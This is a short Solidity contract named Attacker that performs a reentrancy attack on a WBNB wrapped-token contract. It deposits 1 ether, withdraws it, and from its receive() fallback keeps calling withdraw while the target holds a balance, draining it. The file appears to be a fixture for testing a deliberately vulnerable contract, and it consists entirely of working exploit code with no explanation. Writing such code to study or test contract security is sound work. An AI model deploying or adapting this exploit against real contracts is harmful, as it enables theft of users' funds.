// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "../WBNB.sol";

contract Attacker {

  WBNB weth;

  constructor(address _weth) {
    weth = WBNB(_weth);
  }

  function attack() external {
    weth.deposit{value: 1 ether}();
    weth.withdraw(1 ether);
  }

  receive() external payable {
    if(address(weth).balance > 0){
      weth.withdraw(1 ether);
    }
  }

}